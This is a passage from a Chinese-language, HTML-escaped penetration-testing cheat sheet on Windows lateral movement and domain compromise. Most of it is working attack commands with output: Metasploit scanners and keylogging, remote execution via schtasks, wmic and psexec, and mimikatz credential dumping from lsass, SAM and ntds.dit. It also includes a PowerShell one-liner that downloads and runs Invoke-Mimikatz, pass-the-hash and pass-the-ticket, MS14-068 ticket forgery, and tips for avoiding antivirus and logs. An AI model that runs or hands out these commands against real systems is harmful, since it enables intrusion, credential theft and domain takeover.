&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;数据库：&lt;/p&gt;

&lt;p&gt;port:1433 （Sqlserver）&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use auxiliary/scanner/mssql/mssql_login  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:3306 (Mysql)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/mysql/mysql_login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port: 27017、27018 (Mongodb)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/mongodb/mongodb_login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:6379 （Redis）&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/redis/redis_login
auxiliary/scanner/redis/file_upload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:1521 (Oracle)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search Oracle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:5432 (PostgreSQL)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search PostgreSQL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;use auxiliary/server/socks4a&lt;br /&gt;
proxychains设置socks4为上条设置的，即可在本地代理扫描, 目前msf已经支持 socks5 代理&lt;/p&gt;

&lt;h3 id=&quot;msf端口转发portfwd&quot;&gt;Msf端口转发portfwd&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -L 0.0.0.0 4443 -p 3389 -r 192.168.2.100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将192.168.1.2.100内网转发到本地4443 port，流量大不好用&lt;/p&gt;

&lt;h3 id=&quot;msf截屏没被360拦没提示或许有意外收获&quot;&gt;Msf截屏(没被360拦没提示，或许有意外收获)&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; use espia
meterpreter &amp;gt; screengrab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;msf嗅探&quot;&gt;Msf嗅探&lt;/h3&gt;
&lt;hr /&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; use sniffer
Loading extension sniffer...Success.
meterpreter &amp;gt; help

Sniffer Commands
================

    Command             Description
    -------             -----------
    sniffer_dump        Retrieve captured packet data to PCAP file
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface

meterpreter &amp;gt; sniffer_interfaces

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
4 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
5 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

meterpreter &amp;gt; sniffer_start 5
[*] Capture started on interface 5 (50000 packet buffer)
meterpreter &amp;gt; sniffer_dump 5 /tmp/1.pcap
[*] Flushing packet capture buffer for interface 5...
[*] Flushed 2540 packets (1450560 bytes)
[*] Downloaded 036% (524288/1450560)...
[*] Downloaded 072% (1048576/1450560)...
[*] Downloaded 100% (1450560/1450560)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /tmp/1.pcap
meterpreter &amp;gt; sniffer_stop 5
[*] Capture stopped on interface 5
[*] There are 29 packets (2263 bytes) remaining
[*] Download or release them using 'sniffer_dump' or 'sniffer_release'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;键盘记录&quot;&gt;键盘记录&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Msf键盘记录在win不会创建新进程&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; keyscan_start 
Starting the keystroke sniffer ...
meterpreter &amp;gt; keyscan_dump 
Dumping captured keystrokes...
jamd&amp;lt;CR&amp;gt;
meterpreter &amp;gt; keyscan_stop 
Stopping the keystroke sniffer...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Keylogger(tip:可以把管理工具，如navicat,putty,SecureCRT,PLSQL设置记住密码)
ixkeylog,linux&amp;gt;=2.63 –redrain推荐&lt;/p&gt;

&lt;h2 id=&quot;远程命令执行&quot;&gt;远程命令执行&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;at\schtasks\psexec\wmic\sc\ps&lt;/p&gt;

&lt;p&gt;window 在工作组内用非 Administrator (SID!=500)其他管理员建立远程连接( wmi, ipc$ )，权限不是管理权限，可以改 LocalAccountTokenFilterPolicy  = 1&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg add  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system 
/v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ipc&quot;&gt;ipc$&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;开启共享，开445，139 port&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:&amp;gt;net use \\192.168.1.254\c$ &quot;pwd&quot; /user:user     //连接192.168.1.254的IPC$共享，用unc路径
如果是域用户 D:&amp;gt;net use \\192.168.1.254\c$ &quot;pwd&quot; /user:domain\user
D:&amp;gt;copy srv.exe \\192.168.1.254\c$ //复制本地srv.exe到C根目录
D:&amp;gt;net time \\192.168.1.254         //查时间
D:&amp;gt;at　\\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动srv.exe (这里360会拦截)
D:&amp;gt;net use \\192.168.1.254\c$ /del 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;schtasks&quot;&gt;Schtasks&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;这里schtasks用着很舒服:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;schtasks /create /tn mytask /s ip /tr F:\Desktop.exe /sc minute /mo 1  /F 每分运行1次  普通权限即可， /s参数 远程ip 用于ipc连接后，远程主机执行 ，/F 表示有重名直接覆盖和创建或删除修改计划不再确认
schtasks /create /tn mytask /tr F:\Desktop.exe /sc minute /mo 1 /ru system /F  管理员权限运行 如果程序有参数用引号&quot;C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp&quot; schtasks /Create /TN test /SC DAILY /ST 00:09 /TR notepad.exe /RU SYSTEM 内置命令前加&quot;cmd /c&quot;

schtasks /create /tn mytask /tr &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy41\windows\NTDS\ntds.dit c:\ntds.dit 2&amp;gt;&amp;amp;1 &amp;gt; c:\windows\temp\1.txt&quot; /sc minute /mo 1  /f /ru system /s 172.17.1.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\jboss-5.1.0.GA\bin\&amp;gt;schtasks /create /tn mytask /s 172.17.1.1 /tr &quot;C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp&quot; /sc minute /mo 2
SUCCESS: The scheduled task &quot;mytask&quot; has successfully been created.

C:\jboss-5.1.0.GA\bin\&amp;gt;schtasks /Query /TN mytask /s 172.17.1.1
Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
mytask                                   16-05-2018 07:50:00    Ready          

C:\jboss-5.1.0.GA\bin\&amp;gt;schtasks /Run /TN mytask /s 172.17.1.1

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
mytask                                   16-05-2018 07:52:00    Ready          

C:\jboss-5.1.0.GA\bin\&amp;gt;schtasks /Delete /TN mytask /F /s 172.17.1.1
SUCCESS: The scheduled task &quot;mytask&quot; was successfully deleted.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;psexec&quot;&gt;psexec&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;psexec 不推荐用,创建服务并删除,产生日志，需要开共享&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec -r sanr \\192.168.1.101 -u user -p pass cmd -r 参数为创建的服务名 可能绕过检测
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;wmi135&quot;&gt;wmi(135)&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;wmi 如果防火墙开启无法连接，优点无日志，无落地(写入磁盘)，以下命令无回显，写入txt，type查看&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmic /node:192.168.1.101 /user:admin /password:@!123QWW
process call create &quot;cmd.exe /c whoami&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;wmiexec&quot;&gt;wmiexec&lt;/h4&gt;
&lt;hr /&gt;

&lt;p&gt;cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password 
如果没明文密码，pth后利用。
http://www.91ri.org/12908.html&lt;/p&gt;

&lt;h3 id=&quot;winexe&quot;&gt;winexe&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;winexe可以从Linux上远程执行windows命令（SMB），kali自带&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./winexe --system -U 'Administrator%123123' //192.168.1.101 'cmd.exe /c whoami'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;psremoting&quot;&gt;PsRemoting&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;2012 r2起,默认端口5985,系统自带远程管理winrs
winrs -r:192.168.1.101 -u:administrator -p:pwd ipconfig&lt;/p&gt;

&lt;h2 id=&quot;mimikatz--procdump-获得内存-hash&quot;&gt;mimikatz + procdump 获得内存 hash&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;如果服务器是64位，要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意&lt;/p&gt;

&lt;p&gt;运行&lt;code class=&quot;highlighter-rouge&quot;&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp&lt;/code&gt;(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令
&lt;code class=&quot;highlighter-rouge&quot;&gt;mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\Temp\test\x64&amp;gt;mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on May  2 2018 00:26:52
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &amp;gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &amp;gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'
mimikatz # sekurlsa::logonPasswords full
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 4 ; 484366552 (00000004:1cded8d8)
Session           : RemoteInteractive from 4
User Name         : admin
Domain            : xx
Logon Server      : WIN-VEG0FAB6OQS
Logon Time        : 5/5/2018 11:49:44 AM
SID               : S-1-5-21-970513389-3385549917-1141547890-1128
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : xx
         * NTLM     : xxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxxxxxx
         [00010000] CredentialKeys
         * NTLM     : xxxxxxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxx
        tspkg :
        wdigest :
         * Username : admin
         * Domain   : xx
         * Password : QWEad!@w123
        kerberos :
         * Username : admin
         * Domain   : xx
         * Password : QWEad!@w123
        ssp :
        credman :
Authentication Id : 0 ; 2138016 (00000000:00209fa0)
Session           : Service from 0
User Name         : dmadmin
Domain            : xx
Logon Server      : WIN-VEG0FAB6OQS
Logon Time        : 3/7/2018 3:23:17 PM
SID               : S-1-5-21-970513389-3385549917-1141547890-1119
        msv :
         [00000003] Primary
         * Username : dmadmin
         * Domain   : xx
         * NTLM     : xxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxx
         [00010000] CredentialKeys
         * NTLM     : xxxxxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxx
        tspkg :
        wdigest :
         * Username : dmadmin
         * Domain   : xx
         * Password : 1234!qw
        kerberos :
         * Username : dmadmin
         * Domain   : xx.com
         * Password : (null)
        ssp :
        credman :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;导出当前 内存 hash，需要免杀过av等&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Windows Server 2012,部分Windows Server 2008默认无法使用mimikatz导出明文口令
解决方法：启用Wdigest Auth
cmd:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;powershell:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重启或者用户再次登录，能够导出明文口令&lt;br /&gt;
&lt;a href=&quot;https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed&quot;&gt;3gstudent自动Dump-Clear-Text-Password-after-KB2871997-installed&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;sam-hash&quot;&gt;SAM-hash&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;管理权限：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save HKLM\SYSTEM Sys.hiv
reg save HKLM\SAM Sam.hiv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;mimikatz:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lsadump::sam /sam:Sam.hiv /system:Sys.hiv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
Domain : MINI
SysKey : 58699cc69ada69e9d859731bec45824d
Local SID : S-1-5-21-687613702-1072107351-1410383080

SAMKey : 339c56f87f46195ddd5158c018a973de

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 22388b7da6d4e33b9ab1cdf631daff8c

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003ee (1006)
User : HomeGroupUser$
  Hash NTLM: 73233a63fa3dd495142e3a362a921221

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pass-the-hash&quot;&gt;pass the hash&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;wmiexec普通权限即可&lt;br /&gt;
https://github.com/maaaaz/impacket-examples-windows&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 &quot;whoami&quot; //domain=TEST user=test1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;or
需要管理权限&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:abc /domain:test.local /ntlm:hash&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/hashdump
Administrator:500:xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c:::
meterpreter &amp;gt; background
msf &amp;gt; use exploit/windows/smb/psexec
msf exploit(psexec) &amp;gt; set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) &amp;gt; set SMBuser Administrator
msf exploit(psexec) &amp;gt; set SMBPass xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) &amp;gt; exploit
meterpreter &amp;gt; shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装了KB2871997补丁或者系统版本大于等于windows server 2012时，内存不再明文保存密码，1,改注册表后，注销再次登录，可以使用，schtasks等执行命令无法用管理员权限。2.用ptk，ptt。例外，打补丁后administrato（SID-500）依旧可以pth&lt;/p&gt;

&lt;p&gt;https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/&lt;/p&gt;

&lt;h3 id=&quot;pass-the-key&quot;&gt;pass the key&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;需要免杀：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;  获取用户的aes key
mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:a /domain:test.local /aes256:asdq379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot;  注入aes key
dir \\计算机名
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pass-the-ticket&quot;&gt;pass the ticket&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;不需要管理员权限&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kekeo &quot;tgt::ask /user:abc /domain:test.local /ntlm:hash&quot; https://github.com/gentilkiwi/kekeo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;导入ticket：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kekeo &quot;kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ntdsdit&quot;&gt;ntds.dit&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;vssadmin方法&amp;gt;=win 2008&lt;br /&gt;
查询当前系统的快照&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin list shadows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;创建快照&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin create shadow /for=c: 获得Shadow Copy Volume Name为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;复制ntds.dit&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\NTDS\ntds.dit c:\ntds.dit    copy第一个参数为创建快照时位置
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;复制system和sam&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\system c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\sam c:\
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;删除快照&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin delete shadows /for=c: /quiet
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取将以上system，sam, ntds.dit 放到 /root/ntds_cracking/下，运行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL -outputfile  hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone  https://github.com/CoreSecurity/impacket.git
cd impacket-master/
python setup.py  install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;py地址 https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
参考：&lt;a href=&quot;http://www.4hou.com/technology/10573.html&quot;&gt;域渗透——获得域控服务器的NTDS.dit文件&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;dc定位&quot;&gt;dc定位&lt;/h4&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nltest dclist:xx.xx
net time /domain
systeminfo 中的domain
ipconfig /all 中的DNS Suffix Search List
扫描53端口，找dns位置
C:\jboss-5.1.0.GA\bin\&amp;gt;set log
LOGONSERVER=\\DC01
net group &quot;domain controllers&quot; /domain
PowerView Get-NetDomainController
PowerView地址https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;windows-log&quot;&gt;windows log&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;微软第三方信息收集工具LogParser.exe psloglist.exe等&lt;/p&gt;

&lt;h2 id=&quot;powerhsell神器&quot;&gt;powerhsell神器&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;nishang
https://github.com/samratashok/nishang&lt;/p&gt;

&lt;p&gt;spn扫描
https://github.com/nullbind/Powershellery/tree/master/Stable-ish&lt;/p&gt;

&lt;p&gt;PowerSploit
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon&lt;/p&gt;

&lt;p&gt;针对ps的Empire
https://github.com/EmpireProject/Empire&lt;/p&gt;

&lt;h2 id=&quot;ms14-068-kerberos漏洞利用&quot;&gt;ms14-068 Kerberos漏洞利用：&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;生成TGT：用于伪造&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami /all
					  用户@ 域名                 用户sid    域主机
python ms14068.py -u admin@xxx.com -p password -s sid -d dc.xxx.com
ms14068.exe -u admin@xxx.com -p password -s sid -d dc.xxx.com 会生成TGT_admin@xxx.com.ccache
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注入TGT：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;klist
klist purge 清除所有凭证，等一会在执行下列命令(https://www.t00ls.net/thread-28727-1-1.html)
写入内存 mimikatz.exe &quot;kerberos::ptc c:\TGT_admin@xxx.com.ccache&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若成功&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir \\dc.xxx.com\c$
net user admin xxxxx@password /add /domain
